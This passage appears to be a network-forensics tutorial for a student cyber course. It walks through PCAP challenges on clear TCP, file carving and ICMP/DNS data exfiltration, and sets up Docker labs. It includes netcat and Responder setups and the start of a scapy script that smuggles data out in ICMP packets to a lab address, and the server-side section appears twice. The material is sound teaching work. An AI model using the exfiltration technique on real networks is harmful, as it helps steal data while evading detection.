data-srcset="https://i.imgur.com/JINQ0MV.png, https://i.imgur.com/JINQ0MV.png 1.5x, https://i.imgur.com/JINQ0MV.png 2x" data-sizes=auto alt=https://i.imgur.com/JINQ0MV.png title=https://i.imgur.com/JINQ0MV.png></p><p>It is possible to find this result without our magic column. Wireshark is able to track a TCP connection flow. This is one of the most useful features in my opinion:</p><blockquote><p>Right click on the desired packet -> Follow TCP stream</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/i0V3Nlz.gif data-srcset="https://i.imgur.com/i0V3Nlz.gif, https://i.imgur.com/i0V3Nlz.gif 1.5x, https://i.imgur.com/i0V3Nlz.gif 2x" data-sizes=auto alt=https://i.imgur.com/i0V3Nlz.gif title=https://i.imgur.com/i0V3Nlz.gif></p><p>A new window will appear with the content of the TCP stream. In our example, there is only one stream containing little information. However, it is possible to do the same on all TCP-based protocols and quickly obtain information.</p><h3 id=do-it-yourself>Do it yourself</h3><p>Each challenge will have this section. With the following resources you&rsquo;re able to reproduce the challenge environment at home.</p><h4 id=prerequisites>Prerequisites</h4><p>To do this task, and probably all challenge after, you&rsquo;ll need:</p><ul><li>Docker</li><li>Wireshark / tshark</li></ul><h4 id=setting-up-the-environment>Setting up the environment</h4><p>Store the following code into a file called Dockerfile:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=l>FROM debian:latest</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN apt update &amp;&amp; \</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>apt install -y --no-install-recommends netcat.traditional</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN rm -rf /var/lib/apt/lists/*</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>COPY run.sh /run.sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN chmod +x /run.sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>EXPOSE 1664</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>ENTRYPOINT [&#34;/run.sh&#34;]</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>In the <strong>Dockerfile</strong> folder, store the following bash code in <strong>run.sh</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s2>&#34;[+] Container IP: &#34;</span>
</span></span><span class=line><span class=cl>ip a <span class=p>|</span> grep inet <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> tail -n+2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nc -lvp <span class=m>1664</span>
</span></span></code></pre></td></tr></table></div></div><p>Now, just build your container, follow these command lines:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo docker build . -t cleartcp <span class=c1># Generate the docke container</span>
</span></span><span class=line><span class=cl>$ sudo docker run --rm --name cleartcp -t cleartcp
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Container IP: 172.17.0.2/16
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>1664</span> ...
</span></span></code></pre></td></tr></table></div></div><p>Congratulation! You just did your first docker container!</p><h4 id=wireshark-analysis>Wireshark analysis</h4><p>Docker provides a network interface and use your host as the gateway. So open <strong>Wireshark</strong> and listen on your <strong>docker0</strong> network interface to catch all packets. If you&rsquo;re seeing some ICMP and ARP packets, don&rsquo;t worry. It&rsquo;s just Docker if everything is well connected.
Next step will be the easiest: sending data on the right port using netcat:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;Students cyber mooc !&#34;</span> <span class=p>|</span> nc 172.17.0.2 <span class=m>1664</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/hmtsiD7.gif data-srcset="https://i.imgur.com/hmtsiD7.gif, https://i.imgur.com/hmtsiD7.gif 1.5x, https://i.imgur.com/hmtsiD7.gif 2x" data-sizes=auto alt=https://i.imgur.com/hmtsiD7.gif title=https://i.imgur.com/hmtsiD7.gif></p><h2 id=file-transfer>File transfer</h2><h3 id=statement-1>Statement</h3><p>In this PCAP file there is also some TCP traffic. But this time it&rsquo;s not a text message, but a file. The purpose of this practical exercise will be to find it and open it to see what this mysterious file contains.</p><table><thead><tr><th>Filename</th><th>Hash</th><th>Download link</th></tr></thead><tbody><tr><td>filetransfer.pcapng</td><td>b1cfd7c12581d9b0b2c99008d3a7e746</td><td><a href=https://mega.nz/#!iL5GES4b!NLrHvjJoYTSavweDCR1zxgsbyxsMsw-M9k-VWVLjUWM target=_blank rel="noopener noreffer">https://mega.nz/#!iL5GES4b!NLrHvjJoYTSavweDCR1zxgsbyxsMsw-M9k-VWVLjUWM</a></td></tr></tbody></table><h3 id=resolution-1>Resolution</h3><p>As in the previous practical exercise, there is no need to do a statistical analysis to see what contains the PCAP file. Normally now you don&rsquo;t have any excuses for not having the <strong>data.data</strong> and <strong>data.text</strong> columns.</p><p>When opening the file, you can see interesting bytes:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/SWgxpi3.png data-srcset="https://i.imgur.com/SWgxpi3.png, https://i.imgur.com/SWgxpi3.png 1.5x, https://i.imgur.com/SWgxpi3.png 2x" data-sizes=auto alt=https://i.imgur.com/SWgxpi3.png title=https://i.imgur.com/SWgxpi3.png></p><p>In the red frame you can see <strong>PNG</strong>, this acronym is rather explicit, but we will talk a little bit about file structures.
Almost all files have signatures, which is why our operating systems can open them with the appropriate software, even if you specify a wrong extension. In addition, the <strong>file</strong> command on Linux uses the signature to return its type.
In the brown frame, we can see hexadecimal, the beginning of what seems to be a PNG. The signature present at the beginning and at the end of the files, is called <strong>magic numbers</strong>.
If google that, you can easily find the magic numbers of a PNG:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/h56S9RH.png data-srcset="https://i.imgur.com/h56S9RH.png, https://i.imgur.com/h56S9RH.png 1.5x, https://i.imgur.com/h56S9RH.png 2x" data-sizes=auto alt=https://i.imgur.com/h56S9RH.png title=https://i.imgur.com/h56S9RH.png></p><p>Exactly these bytes are present in the brown frame. We can deduce that we are dealing with a PNG image that has been transferred. The <strong>libpng</strong> site tells us a little more about the structure of a PNG. In particular, the signature at the end containing <strong>IEND</strong> chunk:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/9iiG1DS.png data-srcset="https://i.imgur.com/9iiG1DS.png, https://i.imgur.com/9iiG1DS.png 1.5x, https://i.imgur.com/9iiG1DS.png 2x" data-sizes=auto alt=https://i.imgur.com/9iiG1DS.png title=https://i.imgur.com/9iiG1DS.png></p><p>As we can see in the red frame, it&rsquo;s a PNG file:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/pd90wv9.png data-srcset="https://i.imgur.com/pd90wv9.png, https://i.imgur.com/pd90wv9.png 1.5x, https://i.imgur.com/pd90wv9.png 2x" data-sizes=auto alt=https://i.imgur.com/pd90wv9.png title=https://i.imgur.com/pd90wv9.png></p><p>Another method to find the PNG file is using <strong>binwalk</strong>, as I said in tooling section, binwalk is carving tool. It will detect and try to identify file structure:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/4DN9qgb.png data-srcset="https://i.imgur.com/4DN9qgb.png, https://i.imgur.com/4DN9qgb.png 1.5x, https://i.imgur.com/4DN9qgb.png 2x" data-sizes=auto alt=https://i.imgur.com/4DN9qgb.png title=https://i.imgur.com/4DN9qgb.png></p><p>Now we are 100% sure that our transferred file is a full PNG image.
As said several times before, Wireshark is based on a tool called <strong>tshark</strong>. It has the advantage of being in CLI, so with a little practice, we can easily extract the desired data:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/uEwXqiL.png data-srcset="https://i.imgur.com/uEwXqiL.png, https://i.imgur.com/uEwXqiL.png 1.5x, https://i.imgur.com/uEwXqiL.png 2x" data-sizes=auto alt=https://i.imgur.com/uEwXqiL.png title=https://i.imgur.com/uEwXqiL.png></p><ul><li><strong>Red frame</strong>: This is the tshark command. The PCAP file is opened and is displaying the raw content of data.data column.</li><li><strong>Yellow frame</strong>: The <strong>tr -d</strong> command will allow you to delete one or more characters. The output of <strong>tshark</strong> with the filter <strong>data.data</strong> looks like <strong>00:11:22:22:33:44</strong>&mldr; with line breaks between each packet. <strong>tr</strong> allows me to delete these characters to have hexdecimal data on a single line.</li><li><strong>Brown frame</strong>: This hexadecimal line represents our PNG picture. Just decode it in a file to retrieve a valid PNG and complete the challenge.</li></ul><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/MbP0OQy.gif data-srcset="https://i.imgur.com/MbP0OQy.gif, https://i.imgur.com/MbP0OQy.gif 1.5x, https://i.imgur.com/MbP0OQy.gif 2x" data-sizes=auto alt=https://i.imgur.com/MbP0OQy.gif title=https://i.imgur.com/MbP0OQy.gif></p><h3 id=do-it-yourself-1>Do it yourself</h3><h4 id=prerequisite>Prerequisite</h4><p>As the last &ldquo;Do it yourself&rdquo; (DIY) I told you to use Docker. In fact, it&rsquo;s not necessary:</p><ul><li>netcat</li><li>Wireshark / tshark</li></ul><h4 id=send-the-picture>Send the picture</h4><p>In this &ldquo;Do it yourself&rdquo;, I&rsquo;m going to use the <strong>loopback (lo)</strong> network interface. Instead of docker network interface. The main advantage of using this interface is the absence of noise during Wireshark capture session.</p><p>Open a linux terminal:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -lvp <span class=m>3615</span> &gt; test.out
</span></span></code></pre></td></tr></table></div></div><p>As the last DIY, open Wireshark but listen on <strong>lo</strong> interface instead of <strong>docker</strong> one. When everything is properly set up, open a second linux terminal and send it to the desired TCP port:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat flag.png <span class=p>|</span> nc 127.0.0.1 <span class=m>3615</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/PfHFaKe.png data-srcset="https://i.imgur.com/PfHFaKe.png, https://i.imgur.com/PfHFaKe.png 1.5x, https://i.imgur.com/PfHFaKe.png 2x" data-sizes=auto alt=https://i.imgur.com/PfHFaKe.png title=https://i.imgur.com/PfHFaKe.png></p><p>As we can see, both file are similar.</p><h2 id=data-exfiltration>Data exfiltration</h2><h3 id=statement-2>Statement</h3><p>When an attacker has been successfully compromised a target, he will tries to extract data as discreetly as possible. ICMP and DNS protocols are oftenly used for this. In the following PCAP file, an evil hacker has stole some sensitive data.</p><table><thead><tr><th>Filename</th><th>Hash</th><th>Download link</th></tr></thead><tbody><tr><td>exfiltration.pcapng</td><td>1e481b149ee2d65c02d1eaea19aaedfa</td><td><a href=https://mega.nz/#!7WwWlApI!pohkUfpW_r1yvnPTUgIL2lsBx-N424YtkdZLUoON-gk target=_blank rel="noopener noreffer">https://mega.nz/#!7WwWlApI!pohkUfpW_r1yvnPTUgIL2lsBx-N424YtkdZLUoON-gk</a></td></tr></tbody></table><h3 id=resolution-2>Resolution</h3><p>When you open the PCAP file, you can see several protocols, such as ARP, ICMP, and DNS. If your columns look like mine, you should see data quickly in the ICMP, which should not contain any.
Then, the subdomains for DNS requests are a little strange, to make it easier to read, I added a column with the filter <strong>dns.qry.name</strong>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/WiAAKim.png data-srcset="https://i.imgur.com/WiAAKim.png, https://i.imgur.com/WiAAKim.png 1.5x, https://i.imgur.com/WiAAKim.png 2x" data-sizes=auto alt=https://i.imgur.com/WiAAKim.png title=https://i.imgur.com/WiAAKim.png></p><p>If you have correctly understood the previous practical exercise, then extracting the data here shouldn&rsquo;t be too difficult. In this PCAP file, I left the &ldquo;noise&rdquo; (ARP, ICMP with DNS), before starting to recover anything, we have to start making some hypotheses:</p><ul><li>What we know<ul><li>ICMP hex data looks to ASCII characters</li><li>DNS subdomains looks to base64 encoded data</li></ul></li><li>Hypotheses<ul><li>Are ICMP decoded data printable?</li><li>What&rsquo;s the data hide in subdomains?</li><li>Are ICMP and DNS data related to each other?</li></ul></li></ul><p>Before taking out the heavy artillery and diving head down and extract everything, let&rsquo;s try to extract the first ICMP package and the first sub-domain. Just right click on the desired element and copy the value, and decode them in your terminal:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s2>&#34;546865206b657920&#34;</span> <span class=p>|</span> xxd -r -p
</span></span><span class=line><span class=cl>The key
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s2>&#34;UEsDBBQACQAIAHOFd01q&#34;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>PK     s�wMj
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s2>&#34;UEsDBBQACQAIAHOFd01q&#34;</span> <span class=p>|</span> base64 -d <span class=p>|</span> xxd -p
</span></span><span class=line><span class=cl>504b03041400090008007385774d6a
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/zeUKVar.gif data-srcset="https://i.imgur.com/zeUKVar.gif, https://i.imgur.com/zeUKVar.gif 1.5x, https://i.imgur.com/zeUKVar.gif 2x" data-sizes=auto alt=https://i.imgur.com/zeUKVar.gif title=https://i.imgur.com/zeUKVar.gif></p><p>The data contained in the ICMP is indeed ASCII encoded in hexa. The subdomain contains the characters &ldquo;PK&rdquo; followed by non-printable characters&mldr; Ok, let&rsquo;s try to find what type of file it is. According to the following figure, I just decoded the base64 of the first subdomain and print it as hex:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/deJyBbA.png data-srcset="https://i.imgur.com/deJyBbA.png, https://i.imgur.com/deJyBbA.png 1.5x, https://i.imgur.com/deJyBbA.png 2x" data-sizes=auto alt=https://i.imgur.com/deJyBbA.png title=https://i.imgur.com/deJyBbA.png></p><p>As the previous practical exercise,I went to the wikipedia page of file signatures and found that the first 4 bytes corresponded to the magic number of a ZIP archive:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/xWNINBw.png data-srcset="https://i.imgur.com/xWNINBw.png, https://i.imgur.com/xWNINBw.png 1.5x, https://i.imgur.com/xWNINBw.png 2x" data-sizes=auto alt=https://i.imgur.com/xWNINBw.png title=https://i.imgur.com/xWNINBw.png></p><p>Now, we can answer to our previous hypotheses:</p><ul><li>Is ICMP data is printable?<ul><li>Yes, it starts with &ldquo;The key&rdquo;.</li></ul></li><li>Are encoded subdomains contains something relevant?<ul><li>Probably, there is ZIP magic number in the first subdomain.</li></ul></li><li>Are both protocol related to each other?<ul><li>Don&rsquo;t know yet.</li></ul></li></ul><p>Before starting with new hypotheses, let&rsquo;s extract everything:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ tshark -r exfiltration.pcapng -Y icmp.resp_to -T fields -e data.text <span class=p>|</span> xxd -r -p
</span></span><span class=line><span class=cl>The key of the encrypted archive is: CyberMoocMooc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ tshark -r exfiltration.pcapng -Y <span class=s1>&#39;ip.src == 172.17.0.1 &amp;&amp; !icmp&#39;</span> -T fields -e dns.qry.name <span class=p>|</span> sed <span class=s1>&#39;s/\.makictf\.wtf//g&#39;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>PK     s�wMjR��LY
</span></span><span class=line><span class=cl>                 passwd_fileUT    9.�<span class=o>[</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>When I&rsquo;m trying to unzip the archive, it asks me for a password. Let&rsquo;s try with &ldquo;CyberMoocMooc&rdquo;:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/yfltI04.gif data-srcset="https://i.imgur.com/yfltI04.gif, https://i.imgur.com/yfltI04.gif 1.5x, https://i.imgur.com/yfltI04.gif 2x" data-sizes=auto alt=https://i.imgur.com/yfltI04.gif title=https://i.imgur.com/yfltI04.gif></p><h3 id=do-it-yourself-2>Do it yourself</h3><p>As for the clear TCP, I made a small docker. This time I based the container on the image of <strong>Python2 - Alpine</strong>, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: <strong>Responder</strong>.</p><h4 id=server-side>Server side</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=l>FROM python:2-alpine</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN apk add git</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN mkdir /responder &amp;&amp; git clone https://github.com/SpiderLabs/Responder.git /responder</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>COPY run.sh /run.sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN chmod +x /run.sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>ENTRYPOINT [&#34;/run.sh&#34;]</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>And the <strong>run.sh</strong> script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>INTERFACE</span><span class=o>=</span><span class=k>$(</span>ip a <span class=p>|</span> grep BROADCAST <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/@.*$//&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /responder <span class=o>&amp;&amp;</span> ./Responder.py -I <span class=nv>$INTERFACE</span> -wrf
</span></span></code></pre></td></tr></table></div></div><p>Time to build and start our docker:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo docker build . -t responder <span class=o>&amp;&amp;</span> sudo docker run --rm --name responder -t responder
</span></span></code></pre></td></tr></table></div></div><p>You should got something like that:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/jUdHqiZ.png data-srcset="https://i.imgur.com/jUdHqiZ.png, https://i.imgur.com/jUdHqiZ.png 1.5x, https://i.imgur.com/jUdHqiZ.png 2x" data-sizes=auto alt=https://i.imgur.com/jUdHqiZ.png title=https://i.imgur.com/jUdHqiZ.png>
<em>37</em>: Responder up</p><h4 id=client-side>Client side</h4><p>For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic:</p><p>As for the clear TCP, I made a small docker. This time I based the container on the image of Python2 - Alpine, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: Responder.</p><ol><li>Server side</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=l>FROM python:2-alpine</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>MAINTAINER Alan MARREC &lt;amarrec@protonmail.com&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN apk add git</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN mkdir /responder &amp;&amp; git clone https://github.com/SpiderLabs/Responder.git /responder</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>COPY run.sh /run.sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>RUN chmod +x /run.sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>ENTRYPOINT [&#34;/run.sh&#34;]</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>And the run.sh script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>INTERFACE</span><span class=o>=</span><span class=k>$(</span>ip a <span class=p>|</span> grep BROADCAST <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/@.*$//&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /responder <span class=o>&amp;&amp;</span> ./Responder.py -I <span class=nv>$INTERFACE</span> -wrf
</span></span></code></pre></td></tr></table></div></div><p>Time to build and start our docker:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo docker build . -t responder <span class=o>&amp;&amp;</span> sudo docker run --rm --name responder -t responder
</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Client side</li></ol><p>For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl><span class=c1>#-*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>destIP</span> <span class=o>=</span> <span class=s2>&#34;172.17.0.2&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>Exfiltration with ICMP
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>@param mesg: Input to send through ICMP - C</span><span class=si>{bytes}</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>@return: No return, sends packets.
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ping_exf</span><span class=p>(</span><span class=n>mesg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hex_mesg</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>binascii</span><span class=o>.</span><span class=n>hexlify</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>mesg</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>)))[</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=c1># Removing of b&#39; at start and &#39; at end</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=mi>16</span> <span class=c1># Size of block</span>
</span></span><span class=line><span class=cl>    <span class=n>list_split</span> <span class=o>=</span> <span class=p>[</span><span class=n>hex_mesg</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>n</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>hex_mesg</span><span class=p>),</span> <span class=n>n</span><span class=p>)]</span> <span class=c1># Split string into list</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>list_split</span><span class=p>)):</span>
